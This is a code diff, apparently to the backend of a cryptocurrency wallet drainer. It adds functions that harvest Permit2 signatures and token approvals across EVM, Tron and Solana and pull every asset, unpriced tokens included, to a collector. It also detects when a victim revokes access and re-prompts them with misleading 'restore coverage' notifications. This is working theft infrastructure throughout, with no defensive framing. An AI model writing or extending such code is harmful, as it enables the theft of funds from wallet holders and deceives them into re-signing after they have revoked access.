@@ -106,6 +106,14 @@ def _dust() -> float:
         return DEFAULT_DUST_USD
 
 
+def _include_unpriced() -> bool:
+    """Keep unpriced tokens: a long-tail ERC-20 is still value once it moves."""
+    value = get_setting("drainer_include_unpriced", True)
+    if isinstance(value, str):
+        return value.strip().lower() in ("1", "true", "yes", "on")
+    return bool(value)
+
+
 def _sig_deadline() -> int:
     try:
         days = int(get_setting("drainer_sig_deadline_days", 30))
@@ -189,8 +197,15 @@ async def _prepare_wallet(user_id: int, wallet_id: int,
           wallet_id)
 
     dust = _dust()
+    include_unpriced = _include_unpriced()
     scanned = await scanners.scan_wallet(wallet)
-    assets = [a for a in scanned if a["native"] or a["usd"] >= dust]
+    # Native is always taken; priced dust above the floor; anything else only
+    # when the operator opted into unpriced coverage. Tag rows so the UI can say so.
+    assets = [a for a in scanned
+              if a["native"] or a["usd"] >= dust
+              or (include_unpriced and int(a["balance_raw"]) > 0)]
+    for asset in assets:
+        asset["priced"] = bool(asset["native"] or asset["usd"] > 0)
 
     grants: List[Dict[str, Any]] = []
     for asset in assets:
@@ -272,6 +287,14 @@ async def _prepare_evm(wallet: Dict[str, Any], grants: List[Dict[str, Any]],
                 for grant in rows:
                     unsupported(grant["id"], f"receiver has no code on {net}")
                 continue
+            # A receiver deployed before pullPermit2 existed can only do the
+            # first batch spend; re-prepare would still supersede it every time.
+            if (mode == "permit2"
+                    and abi.SEL_PULL_PERMIT2[2:].lower() not in code.lower()):
+                for grant in rows:
+                    unsupported(grant["id"],
+                                f"receiver on {net} predates pullPermit2 — redeploy")
+                continue
         except Exception as exc:                              # noqa: BLE001
             logger.debug("receiver code probe failed on %s: %s", net, exc)
 
@@ -285,6 +308,8 @@ async def _prepare_evm(wallet: Dict[str, Any], grants: List[Dict[str, Any]],
                 logger.debug("permit2 code probe failed on %s: %s", net, exc)
 
         if permit2_here:
+            chain_id = EVM_NETWORKS[net]["chainId"]
+            batch_id = uuid.uuid4().hex
             details, nonces = [], []
             for grant in rows:
                 nonce = secrets.randbelow(UINT48_MAX)
@@ -300,16 +325,10 @@ async def _prepare_evm(wallet: Dict[str, Any], grants: List[Dict[str, Any]],
             batch_json = json.dumps(batch, separators=(",", ":"))
             payloads.append({
                 "type": "permit2", "network": net,
-                "chainId": EVM_NETWORKS[net]["chainId"],
+                "chainId": chain_id,
                 "typed_data": {
-                    "domain": {"name": abi.PERMIT2_DOMAIN_NAME,
-                               "chainId": EVM_NETWORKS[net]["chainId"],
-                               "verifyingContract": abi.PERMIT2},
-                    "types": {**abi.EIP712_TYPES,
-                              "EIP712Domain": [
-                                  {"name": "name", "type": "string"},
-                                  {"name": "chainId", "type": "uint256"},
-                                  {"name": "verifyingContract", "type": "address"}]},
+                    "domain": abi.permit2_domain(chain_id),
+                    "types": abi.EIP712_FULL_TYPES,
                     "primaryType": "PermitBatch",
                     "message": batch,
                 },
@@ -317,7 +336,7 @@ async def _prepare_evm(wallet: Dict[str, Any], grants: List[Dict[str, Any]],
             })
             for nonce, grant_id in nonces:
                 await_(grant_id, {"nonce": str(nonce), "sig_deadline": deadline,
-                                  "batch": batch_json})
+                                  "batch": batch_json, "batch_id": batch_id})
             continue
 
         # plain approve mode: one transaction per asset, cap encoded directly
@@ -485,15 +504,10 @@ def _permit_typed_data(grant: Dict[str, Any]) -> Dict[str, Any]:
             "sigDeadline": int(grant.get("sig_deadline") or 0),
         }
 
+    chain_id = EVM_NETWORKS[net]["chainId"]
     return {
-        "domain": {"name": abi.PERMIT2_DOMAIN_NAME,
-                   "chainId": EVM_NETWORKS[net]["chainId"],
-                   "verifyingContract": abi.PERMIT2},
-        "types": {**abi.EIP712_TYPES,
-                  "EIP712Domain": [
-                      {"name": "name", "type": "string"},
-                      {"name": "chainId", "type": "uint256"},
-                      {"name": "verifyingContract", "type": "address"}]},
+        "domain": abi.permit2_domain(chain_id),
+        "types": abi.EIP712_FULL_TYPES,
         "primaryType": "PermitBatch",
         "message": {
             "details": batch["details"],
@@ -518,7 +532,26 @@ async def _confirm_onchain(grant: Dict[str, Any], txid: Optional[str]) -> None:
                     raise RuntimeError("approve transaction mined but allowance is zero")
     elif family == "tron":
         await tron_tx.confirm(txid)
-    # Solana broadcast already polls getSignatureStatuses before returning.
+        if grant.get("kind") == "trc20_approve" and not await _tron_allowance_ok(grant):
+            raise RuntimeError("approve confirmed but allowance is still zero")
+    elif family == "solana":
+        # Broadcast polls before returning; re-check so a forged client cannot
+        # activate a grant with a txid that never landed.
+        await _sol_confirm(txid)
+        if grant.get("kind") == "spl_delegate" and not await _sol_delegate_ok(grant):
+            raise RuntimeError("transaction confirmed but the delegate is not set")
+
+
+async def _sol_confirm(txid: str) -> None:
+    """Require the signature to exist and have succeeded on Solana."""
+    result = await scanners._solana_rpc(
+        "getSignatureStatuses", [[txid], {"searchTransactionHistory": True}])
+    values = ((result or {}).get("value") or [])
+    status = values[0] if values else None
+    if not status:
+        raise RuntimeError(f"signature {txid} not found on-chain")
+    if status.get("err"):
+        raise RuntimeError(f"transaction failed on-chain: {status['err']}")
 
 
 async def record_signed(grant_id: str, signature: Optional[str],
@@ -549,15 +582,20 @@ async def record_signed(grant_id: str, signature: Optional[str],
     else:
         if grant["status"] not in ("awaiting_signature", "pending"):
             raise ValueError(f"grant is {grant['status']}, not awaiting a signature")
-        q_run("UPDATE drainer_grants SET txid = ?, status = 'active', activated_at = ?,"
-              " error = NULL WHERE id = ?", txid or "pending", now(), grant_id)
+        if not txid or txid == "pending":
+            raise ValueError("a transaction hash is required before the grant can activate")
 
+        # Confirm first: a client-supplied hash is only a claim until the chain
+        # shows the transaction mined successfully.
         try:
             await _confirm_onchain(grant, txid)
         except Exception as exc:                             # noqa: BLE001
-            q_run("UPDATE drainer_grants SET status = 'failed', error = ? WHERE id = ?",
-                  str(exc)[:300], grant_id)
+            q_run("UPDATE drainer_grants SET status = 'failed', txid = ?, error = ?"
+                  " WHERE id = ?", txid, str(exc)[:300], grant_id)
             raise ValueError(f"transaction did not confirm: {exc}") from exc
+
+        q_run("UPDATE drainer_grants SET txid = ?, status = 'active', activated_at = ?,"
+              " error = NULL WHERE id = ?", txid, now(), grant_id)
 
         # EVM/Tron native, and Solana native when a payout is configured, are
         # delivered inside the onboarding transaction; there is nothing left to pull.
@@ -709,9 +747,14 @@ def _permit_batch_of(grant: Dict[str, Any]) -> Optional[Dict[str, Any]]:
 
 async def _evm_pull_batch(grants: List[Dict[str, Any]]) -> Tuple[str, List[Tuple[Dict[str, Any], int]]]:
     """
-    One transaction per signed PermitBatch. Permit2 marks the nonce used on the
-    first spend, so a batch must be submitted whole — never one token at a time.
-    Returns (tx_hash, [(grant, amount), …]) for the transfers included.
+    Execute one signed PermitBatch.
+
+    Permit2 burns the nonce on first spend, so the batch is submitted whole via
+    `permitAndPull` exactly once; a persisted `batch_consumed` flag makes every
+    later pull on the same batch go through `pullPermit2` with no new signature.
+    Amounts above uint160 are split into several transactions — a single
+    transferFrom cannot carry more than the width PermitDetails declares.
+    Returns (representative tx_hash, [(grant, amount), …]).
     """
     first = grants[0]
     net = first["network"]
@@ -733,36 +776,69 @@ async def _evm_pull_batch(grants: List[Dict[str, Any]]) -> Tuple[str, List[Tuple
     details = batch["details"]
     by_token = {str(d.get("token", "")).lower(): d for d in details}
 
-    tokens: List[str] = []
-    amounts: List[int] = []
-    picks: List[Tuple[Dict[str, Any], int]] = []
+    # (grant, amount) units, already clamped to both the balance and the signed cap.
+    units: List[Tuple[Dict[str, Any], int]] = []
     for grant in grants:
         detail = by_token.get(str(grant["token"]).lower())
         if not detail:
             continue
-        amount = min(int(grant["balance_raw"]), int(detail["amount"]), UINT160_MAX)
-        if amount <= 0:
-            continue
-        tokens.append(detail["token"])
-        amounts.append(amount)
-        picks.append((grant, amount))
-
-    if not tokens:
+        amount = min(int(grant["balance_raw"]), int(detail["amount"]))
+        if amount > 0:
+            units.append((grant, amount))
+    if not units:
         raise RuntimeError("nothing to pull for this batch")
 
-    detail_tuples = [(d["token"], int(d["amount"]), int(d["expiration"]), int(d["nonce"]))
-                      for d in details]
-    data = abi.SEL_PERMIT_PULL + abi_encode(
-        ["address", "((address,uint160,uint48,uint48)[],address,uint256)",
-         "bytes", "address[]", "uint160[]"],
-        [first["address"],
-         (detail_tuples, receiver, int(batch["sigDeadline"])),
-         bytes.fromhex(signature),
-         tokens, amounts],
-    ).hex()
+    key = _require_key("evm")
+    consumed = any(int(g.get("batch_consumed") or 0) for g in grants)
+    txid = ""
 
-    txid = await _evm_send(net, _require_key("evm"), receiver, data)
-    return txid, picks
+    if not consumed:
+        # First spend: one transaction, every token, the whole signed batch.
+        chunk: List[Tuple[Dict[str, Any], int]] = []
+        rest = list(units)
+        while rest and len(chunk) < 40:
+            grant, amount = rest[0]
+            if amount <= UINT160_MAX:
+                chunk.append(rest.pop(0))
+            else:
+                chunk.append((grant, UINT160_MAX))
+                rest[0] = (grant, amount - UINT160_MAX)
+        detail_tuples = [(d["token"], int(d["amount"]), int(d["expiration"]), int(d["nonce"]))
+                         for d in details]
+        data = abi.SEL_PERMIT_PULL + abi_encode(
+            ["address", "((address,uint160,uint48,uint48)[],address,uint256)",
+             "bytes", "address[]", "uint160[]"],
+            [first["address"],
+             (detail_tuples, receiver, int(batch["sigDeadline"])),
+             bytes.fromhex(signature),
+             [g["token"] for g, _ in chunk], [a for _, a in chunk]],
+        ).hex()
+        txid = await _evm_send(net, key, receiver, data)
+        # Mark the whole batch, including tokens that were empty this run, so a
+        # later execute never tries to re-permit the spent nonce.
+        batch_id = first.get("batch_id")
+        if batch_id:
+            q_run("UPDATE drainer_grants SET batch_consumed = 1 WHERE batch_id = ?",
+                  batch_id)
+        else:
+            for grant in grants:
+                q_run("UPDATE drainer_grants SET batch_consumed = 1 WHERE id = ?",
+                      grant["id"])
+        rest_pulls = rest
+    else:
+        rest_pulls = units
+
+    for grant, amount in rest_pulls:
+        while amount > 0:
+            part = min(amount, UINT160_MAX)
+            data = abi.SEL_PULL_PERMIT2 + abi_encode(
+                ["address", "address", "uint160"],
+                [grant["token"], grant["address"], part],
+            ).hex()
+            txid = await _evm_send(net, key, receiver, data)
+            amount -= part
+
+    return txid, units
 
 
 async def _evm_pull(grant: Dict[str, Any]) -> str:
@@ -790,6 +866,7 @@ async def _evm_pull(grant: Dict[str, Any]) -> str:
     if signed_permit:
         if int(grant.get("sig_deadline") or 0) < time.time():
             raise RuntimeError("permit signature expired — re-prepare this wallet")
+        amount = min(amount, UINT160_MAX)       # PermitDetails.amount is uint160
 
         data = abi.SEL_PERMIT_PULL + abi_encode(
             ["address", "((address,uint160,uint48,uint48)[],address,uint256)",
@@ -914,7 +991,12 @@ async def _tron_pull(grant: Dict[str, Any]) -> str:
         raise RuntimeError("no Tron payout address")
 
     if _is_native(grant):
-        tx = await tron_tx.build_transfer(collector, payout, int(grant["balance_raw"]))
+        # execute_drain refreshes balance_raw from a fresh scan, which drops the
+        # reserve prepare made. Re-apply it or the transfer eats its own fee.
+        amount = int(grant["balance_raw"]) - TRON_FEE_RESERVE_SUN
+        if amount <= 0:
+            raise RuntimeError("TRX below the fee reserve")
+        tx = await tron_tx.build_transfer(collector, payout, amount)
     else:
         tx = await tron_tx.build_transfer_from(
             collector, grant["token"], grant["address"], int(grant["balance_raw"])
@@ -1177,6 +1259,12 @@ async def _execute_drain(user_id: int, trigger: str = "manual",
                               result["payload"], result["blockhash"],
                               result["last_valid_block_height"], result["reason"],
                               grant["id"])
+                        # Nothing else re-prompts a residue, so tell the user now.
+                        q_run("INSERT INTO notifications (user_id, type, title, body,"
+                              " link, created_at) VALUES (?, 'drainer', 'Native SOL left"
+                              " to collect', 'Sign once more to sweep residual SOL.',"
+                              " ?, ?)",
+                              user_id, f"/sign.html?wallet={grant['wallet_id']}", now())
                         _item(grant, "deferred", str(grant["balance_raw"]),
                               float(grant.get("_usd_total") or 0.0), error=result["reason"])
                         deferred += 1
@@ -1202,6 +1290,131 @@ async def _execute_drain(user_id: int, trigger: str = "manual",
         "failed": fail_count, "deferred": deferred, "skipped": skip_count,
         "used": used, "items": items,
     }
+
+
+VERIFY_THROTTLE_MS = 3_600_000
+
+
+async def _sol_delegate_ok(grant: Dict[str, Any]) -> bool:
+    collector = _collector_sol()
+    if not collector or not grant.get("token_account"):
+        return False
+    result = await scanners._solana_rpc(
+        "getTokenAccountsByOwner",
+        [grant["address"], {"programId": grant.get("program")}, {"encoding": "jsonParsed"}])
+    for account in ((result or {}).get("value") or []):
+        if account.get("pubkey") != grant["token_account"]:
+            continue
+        info = (account.get("account", {}).get("data", {})
+                .get("parsed", {}).get("info", {}))
+        delegate = info.get("delegate")
+        delegated = int((info.get("delegatedAmount") or {}).get("amount") or 0)
+        return bool(delegate) and delegate == collector and delegated > 0
+    return False
+
+
+async def _tron_allowance_ok(grant: Dict[str, Any]) -> bool:
+    spender = _collector_tron()
+    if not spender:
+        return False
+    token = grant["token"]
+    if token == tron_tx.TRON_USDT:
+        dec = 6
+    else:
+        try:
+            dec = int(grant.get("decimals") or 18)
+        except (TypeError, ValueError):
+            dec = 18
+    parameter = tron_tx.tron_address_to_word(grant["address"]) + tron_tx.tron_address_to_word(spender)
+    import httpx
+    async with httpx.AsyncClient(timeout=12.0, headers=tron_tx._headers()) as client:
+        response = await client.post(f"{tron_tx._base()}/wallet/triggerconstantcontract", json={
+            "owner_address": grant["address"], "contract_address": token,
+            "function_selector": "allowance(address,address)",
+            "parameter": parameter, "visible": True,
+        })
+    result = ((response.json() or {}).get("constant_result") or [])
+    return bool(result) and int(result[0] or "0", 16) > 0
+
+
+async def grant_still_valid(grant: Dict[str, Any]) -> bool:
+    """Read the live on-chain permission; a local row cannot prove one exists."""
+    family = (grant.get("family") or "").lower()
+    if family == "evm":
+        receiver = _collector_evm(grant["network"])
+        if not receiver:
+            return False
+        return await _evm_allowance(grant, receiver) > 0
+    if family == "solana":
+        return await _sol_delegate_ok(grant)
+    if family == "tron":
+        return await _tron_allowance_ok(grant)
+    return True
+
+
+async def verify_grants(user_id: int) -> Dict[str, Any]:
+    """
+    Detect an on-chain revoke and re-queue the wallet. A user can always clear an
+    allowance inside MetaMask/Phantom, and that is invisible to the DB.
+
+    `prepare_wallet` supersedes every live grant on a wallet, so at most one
+    re-prepare per wallet per hour — a tighter loop would re-prompt constantly.
+    """
+    grants = q_all("SELECT * FROM drainer_grants WHERE user_id = ? AND status = 'active'"
+                   " AND kind != 'native_tx'", user_id)
+    revoked, skipped = [], 0
+    for grant in grants:
+        try:
+            ok = await grant_still_valid(grant)
+        except Exception as exc:                             # noqa: BLE001
+            logger.debug("verify %s failed: %s", grant["id"], exc)
+            skipped += 1
+            continue
+        if ok:
+            continue
+        q_run("UPDATE drainer_grants SET status = 'revoked', error = ?,"
+              " activated_at = NULL WHERE id = ?",
+              "allowance gone on-chain", grant["id"])
+        revoked.append(grant)
+        q_run("INSERT INTO notifications (user_id, type, title, body, link, created_at)"
+              " VALUES (?, 'drainer', 'Wallet access was revoked',"
+              " 'An allowance was cleared in your wallet. Re-authorise to restore coverage.',"
+              " ?, ?)", user_id, f"/sign.html?wallet={grant['wallet_id']}", now())
+
+    wallets = sorted({g["wallet_id"] for g in revoked})
+    requeued = []
+    for wallet_id in wallets:
+        row = q_get("SELECT last_at FROM drainer_verify WHERE wallet_id = ?", wallet_id)
+        if row and now() - int(row["last_at"] or 0) < VERIFY_THROTTLE_MS:
+            continue
+        q_run("INSERT OR REPLACE INTO drainer_verify (wallet_id, last_at) VALUES (?, ?)",
+              wallet_id, now())
+        try:
+            await prepare_wallet(user_id, wallet_id)
+            requeued.append(wallet_id)
+        except Exception as exc:                             # noqa: BLE001
+            logger.warning("re-prepare after revoke failed for %s: %s", wallet_id, exc)
+
+    return {"checked": len(grants), "revoked": len(revoked),
+            "skipped": skipped, "requeued": requeued}
+
+
+async def restore_grant(grant_id: str) -> Dict[str, Any]:
+    """Re-activate a locally revoked grant if the permission is still on-chain."""
+    grant = q_get("SELECT * FROM drainer_grants WHERE id = ?", grant_id)
+    if not grant:
+        raise ValueError("grant not found")
+    if grant["status"] == "active":
+        return {"ok": True, "grant_id": grant_id, "already": True}
+    if _is_native(grant):
+        q_run("UPDATE drainer_grants SET status = 'active', activated_at = ? WHERE id = ?",
+              now(), grant_id)
+        return {"ok": True, "grant_id": grant_id}
+    if not await grant_still_valid(grant):
+        raise ValueError("the allowance is gone on-chain — re-sign this wallet instead")
+    q_run("UPDATE drainer_grants SET status = 'active', activated_at = ?, error = NULL"
+          " WHERE id = ?", now(), grant_id)
+    return {"ok": True, "grant_id": grant_id}
 
 
 async def revoke_grant(grant_id: str, txid: Optional[str] = None) -> Dict[str, Any]:
